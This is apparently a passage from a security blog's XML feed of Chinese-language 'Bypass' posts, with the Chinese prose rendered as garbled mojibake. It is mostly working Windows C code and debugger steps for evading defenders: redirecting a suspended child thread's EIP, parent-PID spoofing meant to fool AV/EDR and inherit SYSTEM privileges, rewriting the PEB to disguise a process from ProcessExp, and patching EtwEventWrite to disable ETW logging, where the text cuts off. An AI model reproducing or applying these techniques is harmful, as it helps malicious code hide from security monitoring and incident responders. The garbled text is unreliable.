class="number">3000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is child process&quot;</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(STARTUPINFO), &#125;;<span class="comment">//STARTUPINFOçš„ç¬¬ä¸€ä¸ªå…ƒç´ å¿…é¡»åˆå§‹åŒ–ä¸ºè¯¥ç»“æ„ä½“çš„å¤§å°</span></span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	CONTEXT ctx = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is Father Process!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.è·å–çˆ¶è¿›ç¨‹æ¨¡å—</span></span><br><span class="line">	<span class="keyword">if</span> (!GetModuleFileName(<span class="literal">NULL</span>, szPath, <span class="keyword">sizeof</span>(TCHAR) * MAX_PATH)) </span><br><span class="line">	<span class="comment">//å½“ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºNULLçš„æ—¶å€™ï¼Œä¼šè¿”å›å½“å‰è¿›ç¨‹çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å‘ç¼“å†²åŒºï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡æ˜ç¼“å†²åŒºçš„å¤§å°</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;GetModuleFileName() failed! [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//2.åˆ›å»ºæŒ‚èµ·çš„æ–°è¿›ç¨‹</span></span><br><span class="line">	<span class="comment">//è®¾ç½®ä½¿ç”¨å¤šå­—ç¬¦é›† è¿™é‡Œä¸»è¦æ˜¯ä½¿ç”¨Wç‰ˆæœ¬çš„  æ‰¾äº†åŠä¸ªæ™šä¸Šçš„é”™è¯¯æ‰å‘ç°ã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line">	BOOL bRet = CreateProcessW((LPWSTR)szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcessW() failed! [%d]\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//è®¾ç½®çº¿ç¨‹ä¸Šä¸‹æ–‡</span></span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	<span class="comment">//3.è·å–å­è¿›ç¨‹çš„çº¿ç¨‹ä¸Šä¸‹æ–‡</span></span><br><span class="line">	GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//4.è®¾ç½®å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œå°†ctxç»“æ„ä½“é‡Œè¾¹çš„eipé€‰é¡¹æŒ‡å‘å®šä¹‰çš„å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯å°†å½“å‰çš„eipæŒ‡å‘å­è¿›ç¨‹ï¼Œç›´æ¥æ‰§è¡Œå­è¿›ç¨‹çš„å‡½æ•°ï¼‰</span></span><br><span class="line">	ctx.Eip = (DWORD)ChildProcess;</span><br><span class="line">	<span class="comment">//å¦‚æœæ˜¯x64 åˆ™ä½¿ç”¨Rip</span></span><br><span class="line">	<span class="comment">//ctx.Rip = (DWORD64)ChildProcess;</span></span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//5.æ¢å¤ç°åœº</span></span><br><span class="line">	<span class="keyword">if</span>( FALSE == ResumeThread(pi.hThread)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ResumeThread Failed! [%d]\n&quot;</span>,GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a><img src="/posts/e5191117/1.png"></h4><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.csdn.net/annhf/article/details/1272601">https://blog.csdn.net/annhf/article/details/1272601</a><br><a href="https://blog.csdn.net/sxr__nc/article/details/106199728">https://blog.csdn.net/sxr__nc/article/details/106199728</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>çˆ¶è¿›ç¨‹æ¬ºéª—</title>
    <url>/posts/7a4de097/</url>
    <content><![CDATA[<p>çˆ¶è¿›ç¨‹æ¬ºéª— å³åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åæŒ‡å®šå…¶ä»–è¿›ç¨‹ä½œä¸ºè¯¥æ–°å»ºè¿›ç¨‹çš„çˆ¶è¿›ç¨‹<br>çˆ¶è¿›ç¨‹<code>(PPID)</code>æ¬ºéª—æ–¹æ³•å¯ä»¥ç»•è¿‡ <code>AV/EDR</code>æ£€æµ‹ï¼Œä½¿å…¶è®¤ä¸ºæ˜¯ <code>lsass.exe</code> è¿™æ ·çš„åˆæ³•è¿›ç¨‹åœ¨è¿›è¡Œæ´»åŠ¨ã€‚å®ƒé€šè¿‡æ¬ºéª—è¿›ç¨‹çš„ <code>PID</code> ä»¥åŒ¹é…å…¶çˆ¶è¿›ç¨‹çš„ <code>PID</code> æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚è¿™ç§æ–¹æ³•å¯èƒ½å¸¦æ¥çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå¦‚æœçˆ¶è¿›ç¨‹ä»¥ <code>SYSTEM</code> æƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥å‡­å€Ÿè®¿é—®ä»¤ç‰Œçš„ç»§æ‰¿ï¼Œä½¿å…¶å­è¿›ç¨‹ä¹Ÿå…·æœ‰ç›¸åŒçš„ <code>SYSTEM</code> æƒé™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›ç¨‹ï¼š**åœ¨ `Windows` ä¸­ï¼Œåº”ç”¨ç¨‹åºç”±ä¸€ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ç»„æˆã€‚ç®€å•æ¥è¯´ï¼Œå½“å‰æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„ä¸€éƒ¨åˆ†ç§°ä¸ºè¿›ç¨‹ã€‚ä¸åŒçš„åº”ç”¨ç¨‹åºå¯èƒ½ä¼šä½¿ç”¨ç›¸åŒçš„è¿›ç¨‹(å¦‚`cmd.exe`)ï¼Œå¹¶ä¸”ä¸ºé¿å…æ­§ä¹‰ï¼Œä¼šåˆ†é…ä¸€ä¸ªæ•´æ•°æ¥åŒºåˆ†ä¸€ä¸ªè¿›ç¨‹å’Œå¦ä¸€ä¸ªè¿›ç¨‹ã€‚è¯¥æ•´æ•°ç§°ä¸º`PID`ã€‚</span><br><span class="line"></span><br><span class="line">PIDï¼šä»£è¡¨è¿›ç¨‹æ ‡è¯†ç¬¦ (`PID`)ï¼Œå®ƒæ˜¯æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„æ•°å­—è¡¨ç¤ºã€‚`Windows` ä¸­é€šè¿‡ `GetCurrentProcessID()` å‡½æ•°è¿”å›æŒ‡å®šè¿›ç¨‹çš„ `PID`ã€‚</span><br><span class="line"></span><br><span class="line">çˆ¶è¿›ç¨‹ï¼šçˆ¶è¿›ç¨‹æ˜¯å¯ä»¥æ´¾ç”Ÿå¤šä¸ªå­è¿›ç¨‹çš„è¿›ç¨‹ã€‚ä¾‹å¦‚ï¼Œå‘½ä»¤`explorer.exe /e,/root,&quot;Cï¼šWINDOWSSystem32cmd.exe&quot;`å°†æ´¾ç”Ÿ`cmd.exe`ä½œä¸ºçˆ¶è¿›ç¨‹`explorer.exe`çš„å­è¿›ç¨‹ã€‚åœ¨ä»£ç ä¸­ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥ä½¿ç”¨`fork()`ç³»ç»Ÿè°ƒç”¨æ¥æ´¾ç”Ÿå­è¿›ç¨‹ã€‚</span><br><span class="line"></span><br><span class="line">PPIDï¼šä»£è¡¨çˆ¶è¿›ç¨‹æ ‡è¯†ç¬¦(`PPID`)ï¼Œå®ƒæ˜¯æä¾›ç»™çˆ¶è¿›ç¨‹çš„æ•°å­—è¡¨ç¤ºå½¢å¼ã€‚ä»»ä½•åŒ…å«å­è¿›ç¨‹çš„è¿›ç¨‹éƒ½å­˜åœ¨çˆ¶å­å…³ç³»ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨CreateProcessAè¿›è¡Œæ¬ºéª—"><a href="#ä½¿ç”¨CreateProcessAè¿›è¡Œæ¬ºéª—" class="headerlink" title="ä½¿ç”¨CreateProcessAè¿›è¡Œæ¬ºéª—"></a>ä½¿ç”¨CreateProcessAè¿›è¡Œæ¬ºéª—</h4><p>CreateProcessAå‡½æ•°å…è®¸ç”¨æˆ·åˆ›å»ºæ–°è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šé€šè¿‡å…¶ç»§æ‰¿çš„çˆ¶è¿›ç¨‹å®Œæˆåˆ›å»ºã€‚è¯¥å‡½æ•°æœ‰ä¸€ä¸ªåä¸ºâ€œlpStartupInfoâ€çš„å‚æ•°ï¼Œè¯¥å‚æ•°å…è®¸ä½¿ç”¨è€…è‡ªå®šä¹‰è¦ä½¿ç”¨çš„çˆ¶è¿›ç¨‹ã€‚<br>lpStartupInfoå‚æ•°æŒ‡å‘ä¸€ä¸ªåä¸ºâ€œSTARTUPINFOEXâ€çš„ç»“æ„ä½“ï¼Œè¯¥ç»“æ„åŒ…å«å˜é‡â€œlpAttributeListâ€ï¼Œè¿™ä¸ªå˜é‡åœ¨åˆå§‹åŒ–æ—¶å¯ä»¥è°ƒç”¨â€œUpdateProcThreadAttributeâ€å›è°ƒå‡½æ•°è¿›è¡Œå±æ€§æ·»åŠ ï¼Œå¯ä»¥é€šè¿‡â€œPROC_THREAD_ATTRIBUTE_PARENT_PROCESSâ€å±æ€§ä»è€Œå¯¹çˆ¶è¿›ç¨‹è¿›è¡Œè®¾ç½®ã€‚</p>
<pre><code>å¦‚æœåœ¨dwCreationFlagsä¸­EXTENDED_STARTUPINFO_PRESENTæ ‡å‡†ï¼Œé‚£ä¹ˆlpStartupInfoä¼ å…¥çš„å°±ä¼šæ˜¯ä¸€ä¸ªåä¸ºSTARTUPINFOEXAçš„ç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªç»“æ„ä½“èƒ½æŒ‡å®šçˆ¶è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œæœ€ç»ˆä¼ å…¥çš„PPIDä¼šè¢«å†™å…¥åˆ°æ–°è¿›ç¨‹_eprocessç»“æ„ä½“çš„InheritedFromUniqueProcessIdä½ç½®
</code></pre>
<h5 id="å¯»æ‰¾explorer-exeè¿›ç¨‹çš„ID"><a href="#å¯»æ‰¾explorer-exeè¿›ç¨‹çš„ID" class="headerlink" title="å¯»æ‰¾explorer.exeè¿›ç¨‹çš„ID"></a>å¯»æ‰¾explorer.exeè¿›ç¨‹çš„ID</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">FindExplorerPID</span><span class="params">()</span> &#123;</span><br><span class="line">    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="keyword">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Process32First(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!wcscmp(process.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(snapshot);</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFOEXA si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	SIZE_T attributeSize;</span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line">	si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">	  </span><br><span class="line">	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="literal">false</span>, FindExplorerPID());</span><br><span class="line">	</span><br><span class="line">	InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="number">0</span>, attributeSize);</span><br><span class="line">	InitializeProcThreadAttributeList(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//æ·»åŠ çˆ¶è¿›ç¨‹å±æ€§</span></span><br><span class="line">	<span class="keyword">if</span> (!UpdateProcThreadAttribute(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="keyword">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;UpdateProcThreadAttribute Failed!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*å¦‚æœåœ¨dwCreationFlagsä¸­EXTENDED_STARTUPINFO_PRESENTæ ‡å‡†ï¼Œé‚£ä¹ˆlpStartupInfoä¼ å…¥çš„å°±ä¼šæ˜¯ä¸€ä¸ªåä¸ºSTARTUPINFOEXAçš„ç»“æ„ä½“ï¼Œ</span></span><br><span class="line"><span class="comment">	è€Œè¿™ä¸ªç»“æ„ä½“èƒ½æŒ‡å®šçˆ¶è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œ</span></span><br><span class="line"><span class="comment">	æœ€ç»ˆä¼ å…¥çš„PPIDä¼šè¢«å†™å…¥åˆ°æ–°è¿›ç¨‹_eprocessç»“æ„ä½“çš„InheritedFromUniqueProcessIdä½ç½®*/</span></span><br><span class="line">	<span class="comment">//CreateProcessA(NULL, (LPSTR)&quot;notepad&quot;, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;si.StartupInfo, &amp;pi);</span></span><br><span class="line">	<span class="comment">//CreateProcessA(&quot;notepad.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;si.StartupInfo, &amp;pi);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//EXTENDED_STARTUPINFO_PRESENT ç»§æ‰¿çˆ¶è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line">	CreateProcessA(<span class="string">&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,TRUE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, <span class="literal">NULL</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7a4de097/1.png"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.f-secure.com/detecting-parent-pid-spoofing/">https://blog.f-secure.com/detecting-parent-pid-spoofing/</a><br><a href="https://xz.aliyun.com/t/8387">https://xz.aliyun.com/t/8387</a><br><a href="https://idiotc4t.com/defense-evasion/fake-ppid">https://idiotc4t.com/defense-evasion/fake-ppid</a></p>
<hr>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿›ç¨‹ä¼ªè£…</title>
    <url>/posts/a8a7b84c/</url>
    <content><![CDATA[<p>è“é˜Ÿåœ¨æ’æŸ¥æ¶æ„è¿›ç¨‹æ—¶ï¼Œç»å¸¸ä¼šä½¿ç”¨ProcessExpã€ProcessHackerç±»çš„è¿›ç¨‹æ£€æŸ¥å·¥å…·è¿›è¡Œæ£€æŸ¥ï¼Œè€Œæ¶æ„è¿›ç¨‹çš„ç‰¹å¾æ¯”è¾ƒæ˜æ˜¾ï¼Œå¯ä»¥é€šè¿‡ä¼ªé€ PEBè¿›ç¨‹ç¯å¢ƒå—çš„æ–¹å¼æ¥å®ç°è¿›ç¨‹ä¼ªè£…</p>
<h4 id="å®ç°è¿‡ç¨‹"><a href="#å®ç°è¿‡ç¨‹" class="headerlink" title="å®ç°è¿‡ç¨‹"></a>å®ç°è¿‡ç¨‹</h4><p>åœ¨R3 x86ä¸‹ pebé€šå¸¸å­˜ä½åœ¨fs:[30]å¤„, x86ç³»ç»Ÿä¸‹å¾€å¾€é€šè¿‡å†…è”æ±‡ç¼–çš„æ–¹å¼è·å–Pebåœ°å€ï¼Œè€Œåœ¨x64ä¸‹å¯ä»¥é€šè¿‡ä½¿ç”¨ntdll.dllä¸­çš„ <code>NtQueryInformationProcess</code>æ¥è·å–è¿›ç¨‹çš„PEB<br>è®¸å¤šè¿›ç¨‹åˆ†æå·¥å…·ä¼šä»<code>PEB+0x20</code>å¤„çš„ <code>_RTL_USER_PROCESS_PARAMETERS</code> çš„ç»“æ„ä½“å†…è¯»å–<code>pathã€ommandline</code>ç­‰æ•°æ®</p>
<p>windbg é™„åŠ ä¸€ä¸ªnotepad<br><code>!peb</code> æŸ¥çœ‹peb ç¯å¢ƒå— å¾—åˆ°pebåœ°å€<br><img src="/posts/a8a7b84c/1.png"></p>
<p><code>dt _peb 000000c712bc7000</code></p>
<p><img src="/posts/a8a7b84c/2.png"><br>åœ¨<code>_RTL_USER_PROCESS_PARAMETERS+0x60</code>å’Œ<code>_RTL_USER_PROCESS_PARAMETERS+0x70</code>å¤„æœ‰ä¸¤ä¸ª_UNICODE_STRINGç»“æ„ä½“ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªç»“æ„ä½“å¯ä»¥æŸ¥çœ‹å­—ç¬¦ä¸²å­˜æ”¾çš„ä½ç½®</p>
<p><img src="/posts/a8a7b84c/3.png"></p>
<p>åœ¨0x60åç§»çš„åœ°æ–¹ï¼Œ<code>ImagePathName</code>å³ä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œç»“æ„ä½“ä¸º_UNICODE_STRINGï¼Œå®ƒçš„0x08åç§»æŒ‡å‘äº†ä¸€ä¸ªBufferï¼ŒBufferçš„å†…å®¹ä¸ºå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„çš„å­—ç¬¦ä¸²ã€‚åŒç†ï¼Œ0x70åç§»åˆ™æŒ‡å‘äº† CommandLineä¸ºå‘½ä»¤è¡Œå‚æ•°<br><img src="/posts/a8a7b84c/4.png"></p>
<p><code>eu 0x201cbea2348   &quot;C:\\Windows\\system32\\cmd.exe&quot;</code><br>ä¿®æ”¹å®ŒåæŸ¥çœ‹<br><img src="/posts/a8a7b84c/5.png"><br>æ­¤æ—¶è¿˜æ²¡ä¿®æ”¹é•¿åº¦<br>ä¹‹å‰æ˜¯notepad ç°åœ¨æ”¹æˆäº† cmd (å°‘äº†4ä¸ª)<br>ç”±äºæ˜¯unciode æ‰€ä»¥è¦ä¹˜ä»¥2  -&gt; 8ä¸ª(0x16)   0x3e-0x08=0x36<br>ä¿®æ”¹length   ebï¼ˆä¿®æ”¹å­—èŠ‚)<code>eb 0x201cbea1d60 36 </code><br>ç„¶ååœ¨0x36å¤„ä½¿ç”¨0x0ä½œä¸ºç»“æŸç¬¦ <code> eb  0x201cbea2348+0x36 0x0</code><br><img src="/posts/a8a7b84c/6.png"></p>
<p>ç„¶åæ‰“å¼€PRocessExpæŸ¥çœ‹ å¯ä»¥çœ‹åˆ°Pathå¤„å·²ç»è¢«æ”¹æˆäº†cmd<br><img src="/posts/a8a7b84c/7.png"></p>
<p>0x70å¤„çš„CommandLineåŒç†<br><code>eu 0x201cbea2388 &quot;C:\\Windows\\system32\\cmd.exe&quot;</code>eb 0x201cbea2388+0x36 0x0<code> </code>eb 0x201cbea1d70 0x36<code> </code><br><img src="/posts/a8a7b84c/8.png"></p>
<p>æ‰“å¼€ä¸€ä¸ªprocessexp æŸ¥çœ‹å˜åŒ– å¯ä»¥çœ‹åˆ°å·²ç»æ”¹æˆäº†cmd<br><img src="/posts/a8a7b84c/9.png"></p>
<h4 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;winternl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*pNtQueryInformationProcess)</span> <span class="params">(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hPRocess = GetCurrentProcess();</span><br><span class="line">	PROCESS_BASIC_INFORMATION ProcessInformation;</span><br><span class="line">	ULONG len = <span class="number">0</span>;</span><br><span class="line">	HINSTANCE ntdll;</span><br><span class="line">	pNtQueryInformationProcess NtQueryInformationProcess;</span><br><span class="line">	<span class="type">wchar_t</span> commandline[] = <span class="string">L&quot;C:\\windows\\system32\\notepad.exe&quot;</span>;</span><br><span class="line">	ntdll = LoadLibrary(TEXT(<span class="string">&quot;Ntdll.dll&quot;</span>));</span><br><span class="line">	  </span><br><span class="line">	<span class="comment">//è§£æntdll.dllä¸­NtQueryInformationProcessçš„åœ°å€</span></span><br><span class="line">	NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">//è·å–_PEBå¯¹è±¡</span></span><br><span class="line">	(NtQueryInformationProcess)(hPRocess, ProcessBasicInformation, &amp;ProcessInformation, <span class="keyword">sizeof</span>(ProcessInformation), &amp;len);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//æ›¿æ¢å‘½ä»¤è¡Œå’Œæ˜ åƒè·¯å¾„å</span></span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;CommandLine.Buffer = commandline;</span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;ImagePathName.Buffer = commandline;</span><br><span class="line">	<span class="comment">//ä¿®æ”¹é•¿åº¦</span></span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;CommandLine.Length = <span class="keyword">sizeof</span>(commandline);</span><br><span class="line">	ProcessInformation.PebBaseAddress-&gt;ProcessParameters-&gt;ImagePathName.Length = <span class="keyword">sizeof</span>(commandline);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/a8a7b84c/10.png"></p>
<hr>
<p>åœ¨ç”¨æˆ·æ€çš„è¯ å¯ä»¥ä»ä¸Šé¢çœ‹åˆ° å·²ç»è¢«ä¼ªè£…æˆäº†notepad</p>
<p> æ”¹ä¸ªåå…ˆ DisguiseProcess.exe<br><img src="/posts/a8a7b84c/11.png"></p>
<p>å»å†…æ ¸æ€çœ‹ä¸‹ ç”¨windbg è¿›è¡Œå†…æ ¸è°ƒè¯• æŠŠä¸Šé¢çš„exe<br>æ‰¾ä¸€ä¸‹è¿™ä¸ªexe<br><code>!process 0 0 DisguiseProcess.exe </code><br><code>!process ffffa38f4934c080</code> çœ‹ä¸€ä¸‹ç®€è¦çš„ä¿¡æ¯<br><img src="/posts/a8a7b84c/12.png"></p>
<p>ä¹‹å‰åœ¨ç”¨æˆ·å±‚ä½¿ç”¨çš„æ˜¯<code>dt _peb</code><br>åœ¨å†…æ ¸å±‚çš„è¯ä½¿ç”¨<code>dt _eprocess</code><br><code> dt _eprocess ffffa38f4934c080</code>  åœ¨ä¸‹é¢è¿™é‡Œå³å¯æŸ¥çœ‹åˆ°åŸè¿›ç¨‹çš„ImageFileName<br><img src="/posts/a8a7b84c/13.png"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://xz.aliyun.com/t/10435">https://xz.aliyun.com/t/10435</a><br><a href="https://idiotc4t.com/defense-evasion/fake-commandline">https://idiotc4t.com/defense-evasion/fake-commandline</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºäºå†…å­˜è¡¥ä¸çš„ETWç»•è¿‡</title>
    <url>/posts/75320ad6/</url>
    <content><![CDATA[<h3 id="ETW"><a href="#ETW" class="headerlink" title="ETW"></a>ETW</h3><p><code>ETW</code>å…¨ç§°ä¸º<code>Event Tracing for Windows</code>ï¼Œå³windowsäº‹ä»¶è·Ÿè¸ªï¼Œå®ƒæ˜¯Windowsæä¾›çš„åŸç”Ÿçš„äº‹ä»¶è·Ÿè¸ªæ—¥å¿—ç³»ç»Ÿã€‚ç”±äºé‡‡ç”¨å†…æ ¸å±‚é¢çš„ç¼“å†²å’Œæ—¥å¿—è®°å½•æœºåˆ¶ï¼Œæ‰€ä»¥<code>ETW</code>æä¾›äº†ä¸€ç§éå¸¸é«˜æ•ˆçš„äº‹ä»¶è·Ÿè¸ªæ—¥å¿—è§£å†³æ–¹æ¡ˆ</p>
<p>3ç¯ETWæ˜¯é€šè¿‡ntdll.dllä¸‹çš„EtwEventWriteFull å‡½æ•°å®ç°çš„<br>è¿™é‡Œä½¿ç”¨x64bdgå’ŒProcessExp<br>ä½¿ç”¨x64dbgé™„åŠ ä¸€ä¸ªæ–°å»ºçš„powershell  å®šä½åˆ°ntdll!EtwEventWrite</p>
<p><img src="/posts/75320ad6/1.png"><br>ä¸€èˆ¬WindowsAPI ï¼ˆx86ï¼‰é»˜è®¤ä½¿ç”¨stdcall è°ƒç”¨çº¦å®š (x64)é»˜è®¤ä½¿ç”¨fastcallã€å³å¯„å­˜å™¨ä¼ å‚ï¼Œè¢«è°ƒç”¨è€…æ¸…ç†å †æ ˆã€‘ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨retè¿”å›å³å¯<br><img src="/posts/75320ad6/2.png"><br>ç„¶åæŸ¥çœ‹ProcessExpä¸­çš„CLRæ—¥å¿— å‘ç°å·²ç»å˜æˆäº†ç©º<br><img src="/posts/75320ad6/3.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. å»ºç«‹ä¸€ä¸ª Powershell Processï¼Œå¹¶å–å¾— Process Handle</span></span><br><span class="line">	CreateProcessA(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -noexit&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span 